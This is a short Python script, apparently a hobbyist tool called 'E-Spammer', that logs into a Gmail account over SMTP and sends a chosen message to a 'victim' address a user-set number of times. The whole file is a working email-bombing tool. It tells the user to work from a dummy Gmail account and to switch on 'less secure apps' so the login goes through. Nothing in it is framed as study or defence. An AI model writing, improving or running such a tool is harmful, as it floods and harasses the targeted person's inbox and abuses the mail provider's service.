#MADE BY STUGOTSZACH
import smtplib, time, os, sys
from time import sleep
from sys import platform
##COLORS##
def prYellow(skk): print("\033[93m {}\033[00m" .format(skk))
def prPurple(skk): print("\033[95m {}\033[00m" .format(skk))
def prBlack(skk): print("\033[98m {}\033[00m" .format(skk))
def prRed(skk): print("\033[91m {}\033[00m" .format(skk))
underline='\033[04m'
red='\033[31m'
reset='\033[0m'
redbg='\033[41m'

##BANNER##
def banner():
    prRed("███████╗    ███████╗██████╗  █████╗ ███╗   ███╗███╗   ███╗███████╗██████╗ ")
    prRed("██╔════╝    ██╔════╝██╔══██╗██╔══██╗████╗ ████║████╗ ████║██╔════╝██╔══██╗")
    prRed("█████╗█████╗███████╗██████╔╝███████║██╔████╔██║██╔████╔██║██████╗ ██████╔╝")
    prRed("██╔══╝╚════╝╚════██║██╔═══╝ ██╔══██║██║╚██╔╝██║██║╚██╔╝██║██╔═══╝ ██╔══██╗")
    prRed("███████╗    ███████║██║     ██║  ██║██║ ╚═╝ ██║██║ ╚═╝ ██║███████╗██║  ██║")
    prRed("╚══════╝    ╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝")
##CODE##
if platform == "linux" or platform == "linux2":
    os.system('clear')
elif platform == "win32":
    os.system('cls')
server = smtplib.SMTP('smtp.gmail.com',587)
server.starttls()
port = 587
banner()
print("                          ~~~~USE A DUMMY GMAIL~~~~")
print("              ~~~~MAKE SURE TO ALSO TURN ON LESS SECURE APPS!~~~~")
print("Your Gmail Address: ")
gmail = input(red + "")

print(reset + "Password: ")
password = input(red + redbg + "")

print(reset + reset + "Victims Gmail: ")
victim = input(red + "")

print(reset + "Message: ")
message = input(red + "")

print(reset + "Number of emails to send: ")
total = int(input(""))

if platform == "linux" or platform == "linux2":
    os.system('clear')
elif platform == "win32":
    os.system('cls')

try:
    server.login(gmail,password)
    print("Sent messages to: " + victim)
    for i in range(int(total)):
        server.sendmail(gmail,victim,message)
    server.quit()
    print("Finished")
    sleep(2)
except KeyboardInterrupt:
    print ('[-] Canceled')
    sys.exit()
    sleep(3)
except smtplib.SMTPAuthenticationError:
    print ('\n[!] There was an ERROR, have you tried turing on less secure apps?')
    sys.exit()
    sleep(3)
#ZACH IS COOL
